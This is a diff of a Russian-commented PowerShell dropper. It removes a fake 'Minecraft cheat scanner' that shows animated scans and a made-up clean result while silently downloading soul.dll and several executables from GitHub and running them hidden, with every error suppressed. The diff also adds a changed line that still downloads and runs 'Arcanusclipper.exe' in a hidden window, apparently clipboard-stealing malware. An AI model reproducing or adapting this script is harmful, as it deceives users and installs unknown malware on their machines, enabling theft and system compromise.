@@ -71,14 +71,8 @@ try {
 catch {
 }
 
-# Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Xeno.exe" -OutFile "Xeno.exe.exe"; .\Xeno.exe  
-    
-    # Запускаем
-    Start-Process -FilePath "Xeno.exe" -WindowStyle Hidden
-
       # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
+    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
     # Запускаем 
     Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
     
@@ -98,121 +92,8 @@ catch {
     Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
     
     
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
 
-Clear-Host
-$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
-
-Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
-Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
-Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
-Start-Sleep 2
-
-$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
-$found = @()
-$risk = 0
-$startTime = Get-Date
-
-# === СПИННЕР АНИМАЦИЯ ===
-function Show-Spinner {
-    param($text, $duration)
-    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
-    $endTime = (Get-Date).AddSeconds($duration)
-    $i = 0
-    while ((Get-Date) -lt $endTime) {
-        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
-        $i++
-        Start-Sleep 0.1
-    }
-    Write-Host "`r[✓] $text" -ForegroundColor Green
-}
-
-# === 1. ПРОЦЕССЫ (15 сек) ===
-Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
-Show-Spinner "Анализ DLL и инжекторов..." 15
-
-# === 2. .MINECRAFT (15 сек) ===
-Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
-Show-Spinner "Проверка модов, jars, json..." 15
-
-# === 3. TEMP + DOWNLOADS (10 сек) ===
-Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
-Show-Spinner "Поиск скрытых читов..." 10
-
-# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
-Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
-Show-Spinner "Анализ реестра Run/Startup..." 10
-
-# === 5. ПРОГРЕСС-БАР (5 сек) ===
-Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
-for ($p = 0; $p -le 100; $p += 10) {
-    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
-    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
-    Start-Sleep 0.5
-}
-Write-Progress -Completed
-
-# === 6. СЕТИ (5 сек) ===
-Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
-Show-Spinner "Проверка Minecraft серверов..." 5
-
-# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
-$endTime = (Get-Date) - $startTime
-Clear-Host
-Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
-Write-Host "=" * 50 -ForegroundColor Green
-Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
-Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
-Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
-Write-Host "=" * 50 -ForegroundColor Green
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
-
-# ЛОГ (тоже чистый)
-$log = @"
-Minecraft Cheat Scan - $(Get-Date)
-Время: $([math]::Round($endTime.TotalSeconds)) сек
-Найдено: 0
-Риск: 0%
-Статус: ЧИСТО! ✅
-"@
-$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8
-
-Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray
-Write-Host "🎮 " -ForegroundColor Green
-
-# === ЗАГРУЗЧИК everything (после паузы) ===
-Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-
-#  скачиваем и запускаем everything
-try {
-    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
-    Start-Sleep 1
-
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
-    
-    # Запускаем
-    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
-    
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
-    # Запускаем 
-    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
-    
-    # Удаляем файл через 5 секунды
-   
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
-    
-} catch {
-    # Полностью скрываем ошибки
-}
 
 
 
